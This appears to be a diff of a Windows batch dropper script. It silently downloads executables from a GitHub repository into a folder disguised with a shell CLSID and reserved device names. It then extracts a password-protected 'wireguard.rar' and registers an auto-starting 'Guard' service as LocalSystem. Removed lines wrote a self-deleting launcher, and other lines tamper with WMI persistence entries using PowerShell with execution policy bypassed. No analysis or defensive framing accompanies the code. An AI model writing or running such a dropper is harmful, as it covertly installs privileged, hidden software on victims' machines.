@@ -1,11 +1,10 @@
 mkdir %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
-%WINDIR%\System32\curl.exe -s -L -o "\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn" "https://github.com/vltex/0/raw/main/1/wintun.dll"
-%WINDIR%\System32\curl.exe -s -L -o "\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn.exe" "https://github.com/vltex/0/raw/main/1/Index.exe"
+%WINDIR%\System32\curl.exe -s -L -o "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" "https://github.com/vltex/0/raw/main/1/UnRAR.exe"
+%WINDIR%\System32\curl.exe -s -L -o "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar" "https://github.com/vltex/0/raw/main/1/wireguard.rar"
 
-sc create Guard binPath="\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn.exe \\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn" start="auto" obj="LocalSystem"
+"%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe x -y -p741258963 "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar" * "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\"
 
-copy /Y "\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn.exe" "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe"
-(echo \\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe \\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn & echo del /f "%~f0") > "%ProgramData%\USOShared\USOS.cmd"
+sc create Guard binPath="%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Guard.exe %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wintun.dll" start="auto" obj="LocalSystem"
 
 rd /S /Q \\.\%ProgramData%\AUX..\
 rd /S /Q \\.\%ProgramData%\CON..\
@@ -49,4 +48,4 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Names
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='MCS'\" | Remove-WmiObject"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='MCS'\" | Remove-WmiObject"
 
-dir "\\.\%ProgramData%\prndata..\" >nul || "%ProgramData%\USOShared\USOS.cmd" && del /F /S /Q /A "%ProgramData%\USOShared\*.cmd"
+dir "\\.\%ProgramData%\prndata..\" >nul || cmd.exe /c start "" %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Guard.exe %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wintun.dll
